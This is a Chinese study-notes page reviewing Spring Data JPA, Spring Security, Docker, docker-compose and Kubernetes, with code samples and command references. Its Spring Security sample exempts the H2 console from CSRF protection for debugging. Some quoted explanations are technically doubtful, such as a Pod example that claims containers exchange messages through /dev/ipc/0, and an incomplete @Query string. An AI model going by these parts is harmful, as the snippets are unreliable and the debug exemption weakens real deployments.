AccessLevel.PRIVATE, force = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ingredient</span> <span class="keyword">implements</span> <span class="title">Persistable</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Type type;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isNew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line">        WRAP, PROTEIN, VEGGIES, CHEESE, SAUCE</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用-JPA"><a class="header-anchor" href="#使用-JPA">¶</a>使用 JPA</h3><blockquote><p>参考代码 <code>taco-cloud-jpa</code></p></blockquote><p>特点：</p><ul><li>需要定义实体类和数据库表的映射关系；</li><li>不需要实现具体类，只需要写好继承关系；</li><li>依据实体类推断表结构，不需要建表脚本；</li><li>可以自定义查询方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** * 原料仓库 * 实体类型 Ingredient，ID 类型 String * <span class="doctag">@author</span> EagleBear2002 * <span class="doctag">@date</span> 2023/04/07 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IngredientRepository</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">CrudRepository</span>&lt;<span class="title">Ingredient</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor(access = AccessLevel.PRIVATE, force = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ingredient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Type type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line">        WRAP, PROTEIN, VEGGIES, CHEESE, SAUCE</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Taco</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="meta">@Size(min = 5, message = &quot;Name must be at least 5 characters long&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date createdAt = <span class="keyword">new</span> Date();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Size(min = 1, message = &quot;You must choose at least 1 ingredient&quot;)</span></span><br><span class="line">    <span class="meta">@ManyToMany()</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Ingredient&gt; ingredients = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addIngredient</span><span class="params">(Ingredient ingredient)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.ingredients.add(ingredient);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自定义的查询方法"><a class="header-anchor" href="#自定义的查询方法">¶</a>自定义的查询方法</h3><p>定义查询方法，无需实现：</p><ul><li>领域特定语言（ domain specific language DSL) spring data 的命名约定</li><li>查询动词 + 主题 + 断言</li><li>查询动词： get 、 read 、 find 、 count</li><li>例子：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">List&lt;TacoOrder&gt; <span class="title">findByDeliveryZip</span><span class="params">( String deliveryZip )</span></span>;</span><br></pre></td></tr></table></figure><p>声明自定义查询（JDQL 面向对象查询语言）：</p><p>不符合方法命名约定时，或者命名太长时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Query(&quot;Order o where o.deliveryCity = &#x27;Seattle&#x27;&quot;)</span></span><br><span class="line"><span class="function">List&lt;TacoOrder&gt; <span class="title">readOrdersDeliveredInSeattle</span><span class="params">( )</span></span>;</span><br></pre></td></tr></table></figure><h3 id="Jpa、Hibernate、Spring-Data-Jpa-三者之间的关系"><a class="header-anchor" href="#Jpa、Hibernate、Spring-Data-Jpa-三者之间的关系">¶</a>Jpa、Hibernate、Spring Data Jpa 三者之间的关系</h3><ul><li>JPA 的宗旨是为 POJO 提供持久化标准规范；</li><li>Hibernate 作为厂家实现了这一规范；</li></ul><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230407005727833.png" alt></p><h2 id="Spring-Security"><a class="header-anchor" href="#Spring-Security">¶</a>Spring Security</h2><h3 id="用户信息存储"><a class="header-anchor" href="#用户信息存储">¶</a>**用户信息存储</h3><ul><li>内存用户存储</li><li>JDBC 用户存储</li><li>LDAP 用户存储</li></ul><h3 id="保护请求"><a class="header-anchor" href="#保护请求">¶</a>保护请求</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    http</span><br><span class="line">            .authorizeRequests()</span><br><span class="line">            .antMatchers(<span class="string">&quot;/design&quot;</span>, <span class="string">&quot;/orders&quot;</span>).access(<span class="string">&quot;hasRole(&#x27;USER&#x27;)&quot;</span>)</span><br><span class="line">            .antMatchers(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;/**&quot;</span>).access(<span class="string">&quot;permitAll&quot;</span>)</span><br><span class="line"></span><br><span class="line">            .and()</span><br><span class="line">            .formLogin()</span><br><span class="line">            .loginPage(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line">            .and()</span><br><span class="line">            .logout()</span><br><span class="line">            .logoutSuccessUrl(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Make H2-Console non-secured; for debug purposes</span></span><br><span class="line">            .and()</span><br><span class="line">            .csrf()</span><br><span class="line">            .ignoringAntMatchers(<span class="string">&quot;/h2-console/**&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Allow pages to be loaded in frames from the same origin; needed for H2-Console</span></span><br><span class="line">            .and()</span><br><span class="line">            .headers()</span><br><span class="line">            .frameOptions()</span><br><span class="line">            .sameOrigin()</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建自定义登录页"><a class="header-anchor" href="#创建自定义登录页">¶</a>创建自定义登录页</h3><ul><li>当需要认证时转向的登录页：<code>.loginPage(&quot;/&quot;)</code></li><li>视图控制器，定义 login 请求对应的视图：<code>registry.addViewController(&quot;/login&quot;);</code></li><li>登录的 post 请求由 Spring Security 自动处理，名称默认：<code>username</code>、<code>password</code>，可配置</li></ul><h3 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h3><p><img src="https://eaglebear2002.github.io/2023Spring-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20230406223941208.png" alt></p><h2 id="Docker-使用"><a class="header-anchor" href="#Docker-使用">¶</a>Docker 使用</h2><h3 id="docker-run-命令"><a class="header-anchor" href="#docker-run-命令">¶</a>docker run 命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello world</span><br></pre></td></tr></table></figure><ul><li><strong><code>-d</code>: 后台运行容器，并返回容器 ID</strong></li><li><code>-i</code>: 以交互模式运行容器，通常与 <code>-t</code> 同时使用</li><li><code>-t</code>: 为容器重新分配一个伪输入终端，通常与 <code>-i</code> 同时使用</li><li><strong><code>-p</code>: 指定（发布）端口映射，格式为：<code>主机（宿主）端口 容器端口</code></strong></li><li><code>-P</code>: 随机端口映射，容器内部端口随机映射到主机的高端口</li><li><code>--name=&quot;nginx lb&quot;</code>: 为容器指定一个名称</li><li><strong><code>-e username=&quot;ritchie&quot;</code>: 设置环境变量</strong></li><li><code>--env-file=c:/temp1/t1.txt</code>: 从指定文件读入环境变量</li><li><code>--expose=2000-2002</code>: 开放（暴露）一个端口或一组端口；</li><li><code>--link my-mysql:taozs</code>: 添加链接到另一个容器</li><li><code>-v c:/temp1:/data</code>: 绑定一个卷（volume）</li><li><strong><code>--rm</code> 退出时自动删除容器</strong></li></ul><h3 id="其他命令"><a class="header-anchor" href="#其他命令">¶</a>其他命令</h3><p>查看容器 IP 地址：<code>cat /etc/hosts</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&gt; docker --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Management Commands:</span><br><span class="line">  builder     Manage builds</span><br><span class="line">  buildx*     Docker Buildx (Docker Inc., v0.10.3)</span><br><span class="line">  compose*    Docker Compose (Docker Inc., v2.15.1)</span><br><span class="line">  config      Manage Docker configs</span><br><span class="line">  container   Manage containers // 管理 containers</span><br><span class="line">  context     Manage contexts</span><br><span class="line">  dev*        Docker Dev Environments (Docker Inc., v0.1.0)</span><br><span class="line">  extension*  Manages Docker extensions (Docker Inc., v0.2.18)</span><br><span class="line">  image       Manage images // 管理 images</span><br><span class="line">  manifest    Manage Docker image manifests and manifest lists</span><br><span class="line">  network     Manage networks // 管理 network</span><br><span class="line">  node        Manage Swarm nodes</span><br><span class="line">  plugin      Manage plugins</span><br><span class="line">  sbom*       View the packaged-based Software Bill Of Materials (SBOM) <span class="keyword">for</span> an image (Anchore Inc., 0.6.0)</span><br><span class="line">  scan*       Docker Scan (Docker Inc., v0.25.0)</span><br><span class="line">  scout*      Command line tool <span class="keyword">for</span> Docker Scout (Docker Inc., v0.6.0)</span><br><span class="line">  secret      Manage Docker secrets</span><br><span class="line">  service     Manage services</span><br><span class="line">  stack       Manage Docker stacks</span><br><span class="line">  swarm       Manage Swarm</span><br><span class="line">  system      Manage Docker</span><br><span class="line">  trust       Manage trust on Docker images</span><br><span class="line">  volume      Manage volumes // 管理 volume</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  attach      Attach <span class="built_in">local</span> standard input, output, and error streams to a running container</span><br><span class="line">  build       Build an image from a Dockerfile</span><br><span class="line">  commit      Create a new image from a container<span class="string">&#x27;s changes  cp          Copy files/folders between a container and the local filesystem  create      Create a new container  diff        Inspect changes to files or directories on a container&#x27;</span>s filesystem</span><br><span class="line">  events      Get real time events from the server</span><br><span class="line">  <span class="built_in">exec</span>        Run a <span class="built_in">command</span> <span class="keyword">in</span> a running container</span><br><span class="line">  <span class="built_in">export</span>      Export a container<span class="string">&#x27;s filesystem as a tar archive</span></span><br><span class="line"><span class="string">  history     Show the history of an image</span></span><br><span class="line"><span class="string">  images      List images</span></span><br><span class="line"><span class="string">  import      Import the contents from a tarball to create a filesystem image</span></span><br><span class="line"><span class="string">  info        Display system-wide information</span></span><br><span class="line"><span class="string">  inspect     Return low-level information on Docker objects</span></span><br><span class="line"><span class="string">  kill        Kill one or more running containers</span></span><br><span class="line"><span class="string">  load        Load an image from a tar archive or STDIN</span></span><br><span class="line"><span class="string">  login       Log in to a Docker registry</span></span><br><span class="line"><span class="string">  logout      Log out from a Docker registry</span></span><br><span class="line"><span class="string">  logs        Fetch the logs of a container</span></span><br><span class="line"><span class="string">  pause       Pause all processes within one or more containers</span></span><br><span class="line"><span class="string">  port        List port mappings or a specific mapping for the container</span></span><br><span class="line"><span class="string">  ps          List containers</span></span><br><span class="line"><span class="string">  pull        Pull an image or a repository from a registry</span></span><br><span class="line"><span class="string">  push        Push an image or a repository to a registry</span></span><br><span class="line"><span class="string">  rename      Rename a container</span></span><br><span class="line"><span class="string">  restart     Restart one or more containers</span></span><br><span class="line"><span class="string">  rm          Remove one or more containers</span></span><br><span class="line"><span class="string">  rmi         Remove one or more images</span></span><br><span class="line"><span class="string">  run         Run a command in a new container</span></span><br><span class="line"><span class="string">  save        Save one or more images to a tar archive (streamed to STDOUT by default)</span></span><br><span class="line"><span class="string">  search      Search the Docker Hub for images</span></span><br><span class="line"><span class="string">  start       Start one or more stopped containers</span></span><br><span class="line"><span class="string">  stats       Display a live stream of container(s) resource usage statistics</span></span><br><span class="line"><span class="string">  stop        Stop one or more running containers // 停止容器</span></span><br><span class="line"><span class="string">  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE</span></span><br><span class="line"><span class="string">  top         Display the running processes of a container</span></span><br><span class="line"><span class="string">  unpause     Unpause all processes within one or more containers</span></span><br><span class="line"><span class="string">  update      Update configuration of one or more containers</span></span><br><span class="line"><span class="string">  version     Show the Docker version information</span></span><br><span class="line"><span class="string">  wait        Block until one or more containers stop, then print their exit codes</span></span><br></pre></td></tr></table></figure><h2 id="容器镜像构建与编排"><a class="header-anchor" href="#容器镜像构建与编排">¶</a>容器镜像构建与编排</h2><h3 id="Dockerfile-文件的指令"><a class="header-anchor" href="#Dockerfile-文件的指令">¶</a>Dockerfile 文件的指令</h3><ul><li><strong><code>FROM</code> ：指定基础镜像，必须为第一个命令</strong></li><li><strong><code>RUN</code> ：构建镜像时执行的命令</strong></li><li><strong><code>ADD</code> ：将本地文件添加到容器中 tar 类型文件会自动解压</strong></li><li><strong><code>COPY</code> ：功能类似 ADD ，但是不会自动解压文件</strong></li><li><strong><code>CMD</code> ：构建容器后调用，也就是在容器启动时才进行调用</strong></li><li><strong><code>ENTRYPOINT</code> ：配置容器，使其可执行化。配合 CMD 可省去 “ application”，只使用参数，用于 docker run 时根据不同参数执行不同功能</strong></li><li><code>LABEL</code> ：用于为镜像添加元数据</li><li><code>ENV</code> ：设置环境变量</li><li><code>EXPOSE</code> ：指定与外界交互的端口，容器内的端口号 docker run 时加 P 则会映射一个随机号（宿主机）</li><li><code>VOLUME</code> ：用于指定持久化目录 docker run 时如果没有指定挂载目录，会创建一个 volume</li><li><code>WORKDIR</code> ：工作目录，类似于 cd 命令</li><li><code>USER</code> ：指定 运行容器时的用户名或 UID</li><li><code>ARG</code> ：用于指定传递给构建运行时的变量</li><li><code>ONBUILD</code> ：用于设置镜像触发器</li></ul><h3 id="Docker-build"><a class="header-anchor" href="#Docker-build">¶</a>Docker build</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | -</span><br></pre></td></tr></table></figure><p>如何编写最佳的 Dockerfile：<a href="https://zhuanlan.zhihu.com/p/26904830">https://zhuanlan.zhihu.com/p/26904830</a></p><ul><li><code>.dockerignore</code> 文件</li><li>容器只运行单个应用</li><li>将多个 <code>RUN</code> 指令合并为一个</li><li>基础镜像的标签不要用 <code>latest</code></li><li>每个 <code>RUN</code> 指令后删除多余文件</li><li>选择合适的基础镜像（alpine 版本最好）</li><li>设置 <code>WORKDIR</code> 和 <code>CMD</code></li><li>Docker 健康检查 HEALTHCHECK 的使用方法：<a href="https://zhuanlan.zhihu.com/p/386986915">https://zhuanlan.zhihu.com/p/386986915</a></li></ul><h3 id="服务编排工具，docker-compose"><a class="header-anchor" href="#服务编排工具，docker-compose">¶</a>服务编排工具，docker compose</h3><p>Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排</p><p>一个单独的 docker compose.yml 模板文件（ YAML 格式）来定义一组相关联的应用容器为一个项目（project）</p><p>Compose 的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷地生命周期管理</p><p>Compose 中有两个重要的概念：</p><ul><li>服务（service）：一个应用的容器（可能会有多个容器），实际上可以包括若干运行相同镜像的容器实例</li><li>项目（project）：由一组关联的应用容器组成的一个完整业务单元，在 <code>docker.compose.yml</code> 文件中定义</li></ul><p>使用微服务架构的系统一般包含若干个微服务，每个微服务一般部署多个实例。如果每个服务都要手动启停，那么效率低，维护量大</p><p>YAML 文件</p><ol><li><p>使用缩进表示层级关系，不允许使用 Tab 键，只允许使用空格</p></li><li><p><code>#</code> 表示注释，从这个字符一直到行尾，都会被解析器忽略。</p></li><li><p>对象，键值对，使用冒号结构表示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">animal:</span> <span class="string">pets</span></span><br><span class="line"><span class="attr">hash:</span> &#123; <span class="attr">name:</span> <span class="string">Steve</span>, <span class="attr">foo:</span> <span class="string">bar</span> &#125;</span><br></pre></td></tr></table></figure></li><li><p>数组，一组连词线开头的行，构成一个数组</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">Cat</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Dog</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Goldfish</span></span><br><span class="line"><span class="string">行内表示法：</span> <span class="string">`animal:</span> [<span class="string">Cat</span>, <span class="string">Dog</span>]<span class="string">`</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="docker-compose-常用命令"><a class="header-anchor" href="#docker-compose-常用命令">¶</a>docker compose 常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --<span class="built_in">help</span></span><br><span class="line">提到：docker-compose up -d <span class="comment"># 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作</span></span><br><span class="line">提到：docker-compose ps <span class="comment"># 呈现刚才部署的项目下的容器，而不是所有的容器</span></span><br><span class="line">提到：docker-compose ps --services</span><br><span class="line">提到：docker-compose images <span class="comment"># 呈现刚才部署的项目下的镜像，而不是所有的容器</span></span><br><span class="line">docker-compose stop <span class="comment"># 终止整个服务集合</span></span><br><span class="line">docker-compose stop nginx <span class="comment"># 终止指定的服务 （这有个点就是启动的时候会先启动 depond_on 中的容器，关闭的时候不会影响到 depond_on 中的）</span></span><br><span class="line">提到：docker-compose logs -f [services...] <span class="comment"># 查看容器的输出日志</span></span><br><span class="line">docker-compose build [SERVICE...]</span><br><span class="line">docker-compose rm nginx <span class="comment"># 移除指定的容器</span></span><br><span class="line">docker-compose up -d --scale flask=3 organizationservice=2 <span class="comment"># 设置指定服务运行的容器个数</span></span><br></pre></td></tr></table></figure><h2 id="k8s-使用"><a class="header-anchor" href="#k8s-使用">¶</a>k8s 使用</h2><blockquote><p>从第 14 次视频 1:43:21 开始。</p></blockquote><h3 id="k8s-中的资源"><a class="header-anchor" href="#k8s-中的资源">¶</a>k8s 中的资源</h3><ul><li>namespaces</li><li>Pods</li><li>ReplicaSet</li><li>Deployment</li><li>Service</li><li>Ingress</li><li>configmap</li><li>secrets</li><li>serviceaccounts</li><li>DaemonSetf</li></ul><h3 id="Pod"><a class="header-anchor" href="#Pod">¶</a>Pod</h3><p>一个 Pod 可以包含一个或多个容器，因此它可以被看作是内部容器的逻辑宿主机。Pod 的设计理念是为了支持多个容器在一个 Pod 中共享网络和文件系统。</p><ul><li>PID 命名空间： Pod 中不同的应用程序可以看到其他应用程序的进程 ID</li><li>network 命名空间： Pod 中多个容器处于同一个网络命名空间，因此能够访问的 IP 和端口范围都是相同的。也可以通过 localhost 相互访问</li><li>IPC 命名空间： Pod 中的多个容器共享 Inner process Communication 命名空间，因此可以通过 SystemV IPC 或 POSIX 进行进程间通信</li><li>UTS 命名空间： Pod 中的多个容器共享同一个主机名</li><li>Volumes Pod 中各个容器可以共享在 Pod 中定义分存储卷（Volume）</li></ul><blockquote><p>在 Kubernetes 中，您可以使用 Pod 的 <code>.spec</code> 中的 <code>shareProcessNamespace</code> 字段来启用进程命名空间共享。例如，以下是一个使用进程命名空间共享的 Pod 配置文件的示例：第一个容器会向 <code>/dev/ipc/0</code> 写入一条消息，第二个容器会从 <code>/dev/ipc/0</code> 中读取这条消息。这样就实现了两个容器之间的通信。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">share-process-namespace</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">shareProcessNamespace:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">container1</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">command:</span> [ <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo &#x27;Hello from container1&#x27; &gt; /dev/ipc/0; sleep 3600&quot;</span> ]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">container2</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">command:</span> [ <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /dev/ipc/0; sleep 3600&quot;</span> ]</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>一个Pod中的两个容器，一个是Nginx，另一个是Fluentd，它们共享同一个主机名和域名。这意味着Nginx容器可以将日志发送到Fluentd容器，而不必知道Fluentd容器的IP地址。</p></blockquote><h3 id="访问服务的三种方法"><a class="header-anchor" href="#访问服务的三种方法">¶</a>访问服务的三种方法</h3><h4 id="将-pod-或-service-的端口快速映射到本机端口（调试用）"><a class="header-anchor" href="#将-pod-或-service-的端口快速映射到本机端口（调试用）">¶</a>将 pod 或 service 的端口快速映射到本机端口（调试用）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl port-forward pod/myspittr 8081:8080 <span class="comment"># 访问： http://localhost:8081/spittr/</span></span><br><span class="line">kubectl port-forward service/demo 8081:80</span><br></pre></td></tr></table></figure><blockquote><p>上面的pod/是固定的吗？</p><p>不是固定的，您可以将其替换为您想要转发流量的 pod 的名称或 ID。例如，如果您的 pod 名称为 mypod，则可以使用以下命令：<code>kubectl port-forward mypod 8888:5000</code>。请注意，如果您使用的是 pod ID，则需要在 ID 前面添加“pod/”前缀，例如：<code>kubectl port-forward pod/1234-5678-9abc-1234 8888:5000</code>。</p></blockquote><h4 id="创建-ingress"><a class="header-anchor" href="#创建-ingress">¶</a>创建 ingress</h4><p>在Kubernetes中，可以使用Ingress来暴露Pod服务。Ingress 可以为 Service 提供外部可访问的 URL、负载均衡流量、终止 SSL/TLS，以及基于名称的虚拟托管。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl create ingress myspittr class=nginx rule=www.demo.com/*=myspittr:8080 <span class="comment"># 访问： http://www.demo.com/spittr/</span></span><br><span class="line">kubectl delete ingress myspittr</span><br></pre></td></tr></table></figure><p>这是一个kubectl命令，用于创建一个名为myspittr的Ingress，<a href="http://xn--www-zr0f.demo.com/*%E7%9A%84%E8%AF%B7%E6%B1%82%E8%B7%AF%E7%94%B1%E5%88%B0myspittr%E6%9C%8D%E5%8A%A1%E7%9A%848080%E7%AB%AF%E5%8F%A3%E3%80%82class=nginx%E6%98%AF%E6%8C%87%E5%AE%9A%E4%BD%BF%E7%94%A8nginx%E4%BD%9C%E4%B8%BAIngress">将www.demo.com/*的请求路由到myspittr服务的8080端口。class=nginx是指定使用nginx作为Ingress</a> Controller。Ingress Controller是Kubernetes中的一种资源类型，它是一个负责管理Ingress资源的组件，可以将外部流量路由到Kubernetes集群中的服务。常见的Ingress Controller有Nginx、Traefik、Istio等。</p><h4 id="通过-curl-工具来访问-k8s-服务"><a class="header-anchor" 